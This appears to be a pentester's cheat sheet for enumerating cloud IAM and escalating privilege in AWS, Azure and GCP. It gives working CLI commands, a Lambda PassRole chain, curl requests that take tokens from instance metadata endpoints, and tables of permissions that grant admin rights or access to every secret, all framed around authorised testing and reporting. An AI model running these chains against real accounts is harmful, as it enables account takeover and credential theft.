# IAM Enumeration & Privilege-Escalation Paths

## AWS

### Identity baseline

```bash
aws sts get-caller-identity
aws configure list
aws iam list-users; aws iam list-roles; aws iam get-user
aws iam list-attached-user-policies --user-name <u>
aws iam list-policies
aws organizations describe-organization
```

### Enumerate what the identity can do

```bash
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::ACCT:user/NAME \
  --action-names s3:GetObject iam:PassRole lambda:InvokeFunction
```

### High-value escalation primitives

| Primitive | Chain |
|---|---|
| `iam:PassRole` + `lambda:CreateFunction`/`UpdateFunctionCode` | create a Lambda with a more privileged role → run as that role |
| `iam:PassRole` + `ec2:RunInstances` | launch an instance with a privileged instance profile |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | attach `AdministratorAccess` to yourself |
| `iam:PutUserPolicy` | same, inline policy |
| `iam:CreatePolicyVersion` + `SetDefaultPolicyVersion` | make an existing managed policy grant more |
| `iam:UpdateAssumeRolePolicy` | rewrite a role's trust policy to include you → assume it |
| `sts:AssumeRole` with a permissive trust | straight to a privileged role |
| `iam:CreateAccessKey` | persist access for another user |
| `lambda:CreateFunctionUrlConfig` | expose a private Lambda publicly |
| `cloudformation:CreateStack` | deploy an instance profile with S3 access |
| `ec2:GetPasswordData` | read the password of a running instance |
| `ssm:GetParameter` / `secretsmanager:GetSecretValue` | read every secret in the account |
| `kms:Decrypt` + a key policy | decrypt everything encrypted with that key |
| `s3:GetObject` on a state file | read terraform state → every secret in the environment |

### The passrole chain, concretely

```bash
aws iam get-role --role-name <TargetRole> --query 'Role.AssumeRolePolicyDocument'
aws lambda create-function --function-name pwn --runtime python3.12 \
  --role arn:aws:iam::ACCT:role/<TargetRole> \
  --handler index.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name pwn --payload '{}' out.json
aws lambda delete-function --function-name pwn
```

Prove it, then delete it, and report both the path and the cleanup.

### Storage

```bash
aws s3 ls s3:// --all-accounts      # enumerate
aws s3 ls s3://bucket --recursive    # list (do NOT download at scale)
aws s3 cp s3://bucket/one-object .  # single-object proof
aws s3api get-bucket-acl --bucket bucket
aws s3api get-bucket-policy --bucket bucket
```

Look for: public ACLs, public bucket policies, `s3:GetObject` granted to `*`, versioning (deleted
objects still retrievable), and object keys that look like credentials.

### CloudFront / CloudTrail / SSM

- CloudFront signed-URL weaknesses (`CloudFront-Policy` window, `Date` skew, `IpAddress` bypass,
  custom policy with `*`).
- CloudTrail logging disabled → the operator cannot see your activity (report it as a detection gap).
- SSM Session Manager access to instances = shell on the box.

## Azure

```bash
az account show
az role assignment list --all
az role definition list --name <custom> --output json
az ad user list --all
az ad app list --all
az keyvault secret list --vault-name <v>
az storage account list
az graph query -q "..."
```

### Azure-specific escalation

| Primitive | Chain |
|---|---|
| `Microsoft.Authorization/roleAssignments/write` | grant yourself Owner |
| `Microsoft.Authorization/elevateAccess` | get access to every subscription |
| `Microsoft.Resources/deployments/write` | deploy an Azure CLI / custom role with owner rights |
| `Microsoft.Compute/virtualMachines/runCommand` | command execution on a VM via the VM agent |
| `Microsoft.KeyVault/vaults/secrets/read` | read every secret in a vault |
| `Microsoft.Storage/storageAccounts/listKeys` | full data access to a storage account |
| `Microsoft.Web/sites/config/list` | read app settings → connection strings |
| `Microsoft.ContainerRegistry/registries/tokens/get` | pull from a registry |
| `Microsoft.Graph` permissions | read mail, files, directory |

### Managed identity abuse

```bash
az account show --query user.assignedIdentity
curl -s -H 'Metadata: true' "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

The token's **roles** determine what is reachable — always read the RBAC assignment for the
principal before assuming access.

### Storage & Functions

```bash
az storage account list -o table
az storage account show-connection-string --name <sa>
az functionapp function list --output table
az functionapp function show --name <fn> --function-name <f>   # code + keys
```

Function apps with function keys in the response = unauthenticated trigger invocation.

## GCP

```bash
gcloud auth list
gcloud projects list
gcloud projects get-iam-policy <proj>
gcloud iam service-accounts list
gcloud storage ls gs://
gcloud functions list
gcloud run services list
gcloud container clusters list
```

### GCP-specific escalation

| Primitive | Chain |
|---|---|
| `iam.serviceAccounts.actAs` | impersonate a high-privilege service account |
| `iam.serviceAccountKeys.create` | mint a key for a service account |
| `resourcemanager.projects.setIamPolicy` | grant yourself Owner |
| `storage.objects.list` + public buckets | data exposure |
| `deployer` / `cloudfunctions.deploy` | deploy a function with a privileged SA |
| `compute.instances.setServiceAccount` | attach a powerful SA to a VM you can create |
| `iam.workloadIdentityPool` | impersonate a GitHub/Argo workload identity |
| `container.clusters.getCredentials` | full cluster admin |
| `secretmanager.versions.access` | read every secret |

GCP metadata: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
with header `Metadata-Flavor: Google`.

## Multi-cloud & hybrid

| Pattern | Check |
|---|---|
| AWS role trusted by an external account | `sts:ExternalId` missing + permissive principal |
| Azure AD app with a certificate | who else can use it |
| GCP service account key in a repo | dead creds |
| OIDC federation with a wildcard subject | `repo:org/*` instead of `repo:org/repo` |
| Shared tenancy across clouds | one credential unlocks all |

## Reporting a cloud finding

```
IDENTITY:  <principal, account/subscription/project>
PERMISSION:<the exact statement from the policy>
PATH:      <step 1 -> step 2 -> ...>
PROOF:     <the API call that succeeded + what it returned>
BLAST:     <one object / one bucket / entire account>
CLEANUP:   <anything you created, deleted>
```
